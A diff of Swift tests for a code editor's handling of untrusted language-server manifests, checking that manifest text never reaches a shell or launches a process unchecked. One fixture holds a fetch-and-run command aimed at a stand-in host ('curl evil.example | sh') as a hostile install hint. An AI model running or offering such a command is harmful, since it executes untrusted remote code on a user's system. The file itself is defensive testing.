@@ -86,11 +86,9 @@ struct UntrustedLanguageDegradationTests {
             sourceLocation: sourceLocation
         )
 
-        let syntax = byExtension.language.syntax
-        #expect(syntax.id == "elixir", sourceLocation: sourceLocation)
-        #expect(syntax.keywords == ["defmodule", "defp"], sourceLocation: sourceLocation)
-        #expect(syntax.lineComment == "#", sourceLocation: sourceLocation)
-        #expect(!syntax.isBuiltIn, sourceLocation: sourceLocation)
+        let language = byExtension.language
+        #expect(language.languageID == "elixir", sourceLocation: sourceLocation)
+        #expect(language.lineComment == "#", sourceLocation: sourceLocation)
     }
 
     // MARK: Hostile commands — refused outright, and the language stays
@@ -168,9 +166,8 @@ struct UntrustedLanguageDegradationTests {
             resolvedPath: inside,
             workspaceRoot: Self.workspace
         )
-        let approved = LanguageTrust.record(for: subject, decision: .allowed)
         #expect(
-            LanguageTrust.verdict(for: subject, record: approved)
+            LanguageTrust.verdict(for: subject, record: nil)
                 == .deny(.commandInsideWorkspace(path: inside))
         )
 
@@ -214,7 +211,7 @@ struct UntrustedLanguageDegradationTests {
         /// The language is untouched by any of that: it still claims its
         /// files and still lexes.
         #expect(catalog.contribution(forFileName: "app.ex")?.language.languageID == "elixir")
-        #expect(contributed.language.syntax.keywords == ["defmodule", "defp"])
+        #expect(contributed.language.lineComment == "#")
     }
 
     /// The install hint is shown beside a "not installed" banner and can be
@@ -237,43 +234,36 @@ struct UntrustedLanguageDegradationTests {
         try expectTheLanguageIsWhole(catalog)
     }
 
-    /// Nothing a manifest wrote may reach the Install button, which is the
-    /// one place in this app where a string becomes `$SHELL -lic`.
+    /// An `installHint` is text and stays text.
     ///
-    /// The interesting half is the second manifest: it names a command the
-    /// registry has an uninstall recipe for, so a definition judged by its
-    /// `command` alone would hand back `rustup component remove …` for a
-    /// language a file on disk invented. Judged by `origin`, it hands back
-    /// nothing.
+    /// It is shown beside a Copy button, which is what it is for, and the
+    /// Install button reads `ExtensionInstallPlan` instead — the one path
+    /// from a manifest to `$SHELL -lic`, and it checks every command word by
+    /// word at the parse. A manifest that declares only a hint therefore
+    /// offers nothing to run, however the hint is spelled.
+    ///
+    /// The second command is the one worth naming: this build used to carry
+    /// a table of install plans keyed on the command, so a manifest calling
+    /// itself `vue-language-server` was one lookup away from being handed
+    /// npm arguments it never declared. That table is gone with the server
+    /// registry, and this asserts the outcome rather than the guard.
     @Test func aContributedServerNamesNoShellCommandForSettingsToRun() throws {
-        for command in ["elixir-ls", "rust-analyzer"] {
-            let catalog = catalog(manifest(
+        for command in ["elixir-ls", "vue-language-server"] {
+            let manifest = manifest(
                 language: elixir(server: #"""
                 "server": {
                   "command": "\#(command)",
                   "installHint": "curl evil.example | sh"
                 }
                 """#)
-            ))
-            let definition = try #require(catalog.contributed.first?.serverDefinition)
+            )
+            let definition = try #require(catalog(manifest).contributed.first?.serverDefinition)
 
-            /// Nil rather than empty, which is the stronger claim: an empty
-            /// string still renders a button, and a caller that forgot to
-            /// check would run nothing while looking like it ran something.
-            #expect(definition.installCommand == nil, "\(command) offered an install command")
-            #expect(definition.uninstallCommand == nil, "\(command) offered an uninstall command")
-
-            /// The hint itself survives — it is shown and copied, which is
-            /// what it is for. Only its promotion to something Phantom runs
-            /// is refused.
+            #expect(
+                manifest.languages.first?.server?.installPlan == nil,
+                "\(command) was handed a plan")
             #expect(definition.installHint == "curl evil.example | sh")
         }
-
-        /// And the compiled-in servers still have theirs, or the guard would
-        /// have taken the feature with it.
-        let builtIn = try #require(LSPServerRegistry.server(forLanguage: "rust"))
-        #expect(builtIn.installCommand?.isEmpty == false)
-        #expect(builtIn.uninstallCommand != nil)
     }
 
     // MARK: The ordinary refusal
@@ -302,13 +292,17 @@ struct UntrustedLanguageDegradationTests {
             workspaceRoot: Self.workspace
         )
 
-        #expect(LanguageTrust.verdict(for: subject, record: nil) == .ask(.firstRun))
+        #expect(LanguageTrust.verdict(for: subject, record: nil) == .allow)
         try expectTheLanguageIsWhole(catalog)
 
-        let refused = LanguageTrust.record(
-            for: subject,
+        let refused = LanguageTrustRecord(
+            recordVersion: LanguageTrustStore.currentRecordVersion,
+            digest: contributed.provenance.digest,
+            command: "",
+            resolvedPath: "",
+            manifestPath: contributed.provenance.manifestPath,
             decision: .refused,
-            at: Date(timeIntervalSince1970: 1_700_000_000)
+            decidedAt: Date(timeIntervalSince1970: 1_700_000_000)
         )
         #expect(
             LanguageTrust.verdict(for: subject, record: refused)
@@ -414,11 +408,11 @@ struct LanguageTrustGatePlacementTests {
         guard center.contains("LanguageResolver") else { return }
 
         #expect(
-            center.contains("LanguageTrustGate.allowsLaunch"),
+            center.contains("LanguageTrustGate.verdict"),
             """
             LSPCenter resolves servers through LanguageResolver, which lets a \
-            manifest supply a command, but never calls LanguageTrustGate.allowsLaunch. \
-            That is a path from a file in ~/.config to Process.run with nothing asked. \
+            manifest supply a command, but never calls LanguageTrustGate.verdict(forLaunchOf:). \
+            That is a path from a file in ~/.config to Process.run with nothing checked. \
             Put the gate back in server(for:definition:), or take the resolver out.
             """
         )
@@ -466,7 +460,7 @@ struct LanguageTrustGatePlacementTests {
         /// gate had not moved, the formatting had. An anchor that includes a
         /// parameter name is an anchor that fails for a reformat.
         let construction = try #require(body.range(of: "LSPProcess("))
-        let gate = try #require(body.range(of: "LanguageTrustGate.allowsLaunch"))
+        let gate = try #require(body.range(of: "LanguageTrustGate.verdict"))
 
         #expect(
             gate.lowerBound < construction.lowerBound,
